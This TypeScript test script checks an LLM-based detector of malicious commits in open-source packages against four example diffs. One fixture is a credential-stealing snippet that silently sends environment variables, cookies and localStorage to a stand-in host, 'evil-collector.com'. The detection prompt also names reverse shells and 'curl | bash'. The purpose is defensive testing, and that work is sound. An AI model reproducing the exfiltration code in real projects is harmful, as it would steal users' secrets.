/**
 * Aegis AI Analysis Test Script
 * 
 * Tests the three-tier security analysis (SAFE, CAUTION, SUSPICIOUS)
 * Run with: npx ts-node test-aegis-analysis.ts
 * 
 * Requires OPENAI_API_KEY environment variable
 */

import OpenAI from 'openai';

const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY,
});

// Test cases with expected verdicts
const testCases = [
    {
        name: 'Safe - Simple bug fix',
        expectedVerdict: 'SAFE',
        diff: `
diff --git a/src/utils/format.js b/src/utils/format.js
--- a/src/utils/format.js
+++ b/src/utils/format.js
@@ -10,7 +10,7 @@ export function formatDate(date) {
-  return date.toISOString().split('T')[0];
+  return date ? date.toISOString().split('T')[0] : '';
 }
`,
    },
    {
        name: 'Caution - Suspicious external URL',
        expectedVerdict: 'CAUTION',
        diff: `
diff --git a/src/analytics.js b/src/analytics.js
--- a/src/analytics.js
+++ b/src/analytics.js
@@ -1,5 +1,12 @@
+import { getSessionData } from './session';
+
+const ANALYTICS_URL = process.env.ANALYTICS_ENDPOINT || 'https://analytics-unknown.io/collect';
+
 export function trackEvent(eventName) {
-  console.log('Event:', eventName);
+  fetch(ANALYTICS_URL, {
+    method: 'POST',
+    body: JSON.stringify({ event: eventName, session: getSessionData() })
+  });
 }
`,
    },
    {
        name: 'Suspicious - Data exfiltration',
        expectedVerdict: 'SUSPICIOUS',
        diff: `
diff --git a/src/helpers/init.js b/src/helpers/init.js
--- a/src/helpers/init.js
+++ b/src/helpers/init.js
@@ -1,3 +1,15 @@
 export function init() {
   console.log('App initialized');
+  
+  // Silently send data
+  setTimeout(() => {
+    fetch('https://evil-collector.com/harvest', {
+      method: 'POST',
+      body: JSON.stringify({
+        env: process.env,
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage)
+      })
+    });
+  }, 5000);
 }
`,
    },
    {
        name: 'Safe - React DevTools pattern (should NOT be flagged)',
        expectedVerdict: 'SAFE',
        diff: `
diff --git a/packages/react-devtools-shared/src/backend/console.js b/packages/react-devtools-shared/src/backend/console.js
--- a/packages/react-devtools-shared/src/backend/console.js
+++ b/packages/react-devtools-shared/src/backend/console.js
@@ -80,6 +80,12 @@ export function patch({
       }
     }
 
+    // Send log message to devtools panel
+    window.postMessage({
+      type: '__REACT_DEVTOOLS_CONSOLE_LOG__',
+      data: args.map(arg => String(arg))
+    }, '*');
+
     return originalMethod.apply(this, args);
   };
 }
`,
    },
];

async function analyzeCommit(diff: string): Promise<string> {
    const prompt = `
You are Aegis, a security auditor for software dependencies. Your job is to detect security issues in code changes.

You are analyzing commits from OPEN SOURCE PACKAGES. Many patterns that seem dangerous are legitimate:
- Dev tools, browser extensions, and build tools use eval, dynamic code, and script injection legitimately
- Configuration injection in settings/preferences is normal
- Message passing between extension components is expected (postMessage, chrome.runtime.sendMessage, etc.)
- Dynamic imports and require() are standard patterns
- window.postMessage with '*' origin is NORMAL for devtools and extensions communicating with pages

Do NOT flag as suspicious:
- postMessage() calls in browser extensions, devtools, or debugging tools
- Message passing between iframe/window contexts (this is standard browser API usage)
- Console/logging utilities that format or relay log data
- Internal data serialization for debugging purposes

Classify the commit as one of three levels:

**SUSPICIOUS** - CONCRETE MALICIOUS CODE found:
- Data exfiltration to EXTERNAL HTTP servers (fetch/XMLHttpRequest to unknown domains)
- Credential/token harvesting (process.env, cookies, localStorage sent to external URLs)
- Obfuscated payloads (hex/base64 that decode to malicious code)
- Backdoor installation (reverse shells, unauthorized remote access)
- Malicious install scripts (curl | bash to untrusted URLs)

**CAUTION** - Potential security concerns worth reviewing:
- New HTTP requests (fetch/axios/XMLHttpRequest) to external URLs that seem suspicious
- Code that sends sensitive data (env vars, cookies, localStorage) to EXTERNAL endpoints
- Unusual obfuscation or encoding that's atypical for the project
- Disabled security features or bypassed checks
- Dependencies on suspicious or typosquatted packages

**SAFE** - No security concerns:
- Normal code patterns for the project type
- Standard library and browser API usage
- Message passing APIs (postMessage, chrome.runtime, etc.) 
- Routine bug fixes, features, or refactoring

Commit Context:
Package: test-package
Repo: test-org/test-repo
SHA: abc1234

Diff:
\`\`\`diff
${diff}
\`\`\`

RESPONSE FORMAT:
Start with exactly one of: **SUSPICIOUS**, **CAUTION**, or **SAFE**

If SAFE: One brief sentence explaining why.

If CAUTION or SUSPICIOUS: Provide:
- **File:** \`filename\` (Line X)
- **Code:**
\`\`\`
[the concerning code snippet]
\`\`\`
- **Concern:** What this code does and why it's concerning
- Use bullet points for multiple issues
`;

    const completion = await openai.chat.completions.create({
        model: 'gpt-4-turbo-preview',
        messages: [
            { role: 'system', content: 'You are a helpful and vigilant security assistant.' },
            { role: 'user', content: prompt }
        ],
        temperature: 0.1,
    });

    return completion.choices[0].message.content || '';
}

function extractVerdict(response: string): string {
    if (response.includes('**SUSPICIOUS**') || response.toLowerCase().startsWith('suspicious')) {
        return 'SUSPICIOUS';
    }
    if (response.includes('**CAUTION**') || response.toLowerCase().startsWith('caution')) {
        return 'CAUTION';
    }
    if (response.includes('**SAFE**') || response.toLowerCase().startsWith('safe')) {
        return 'SAFE';
    }
    return 'UNKNOWN';
}

async function runTests() {
    console.log('🔍 Aegis AI Analysis Test Suite\n');
    console.log('='.repeat(60));

    if (!process.env.OPENAI_API_KEY) {
        console.error('❌ Error: OPENAI_API_KEY environment variable is not set');
        console.log('\nUsage: OPENAI_API_KEY=sk-xxx npx ts-node test-aegis-analysis.ts');
        process.exit(1);
    }

    let passed = 0;
    let failed = 0;

    for (const testCase of testCases) {
        console.log(`\n📋 Test: ${testCase.name}`);
        console.log(`   Expected: ${testCase.expectedVerdict}`);

        try {
            const response = await analyzeCommit(testCase.diff);
            const verdict = extractVerdict(response);

            const match = verdict === testCase.expectedVerdict;

            if (match) {
                console.log(`   ✅ PASSED - Got: ${verdict}`);
                passed++;
            } else {
                console.log(`   ❌ FAILED - Got: ${verdict} (expected ${testCase.expectedVerdict})`);
                failed++;
            }

            console.log('\n   Response preview:');
            console.log('   ' + response.split('\n').slice(0, 5).join('\n   '));

        } catch (error: any) {
            console.log(`   ❌ ERROR: ${error.message}`);
            failed++;
        }

        // Rate limiting pause
        await new Promise(r => setTimeout(r, 1000));
    }

    console.log('\n' + '='.repeat(60));
    console.log(`\n📊 Results: ${passed} passed, ${failed} failed out of ${testCases.length} tests`);

    if (failed === 0) {
        console.log('🎉 All tests passed!');
    } else {
        console.log('⚠️ Some tests failed. Review the prompt tuning.');
        process.exit(1);
    }
}

runTests();
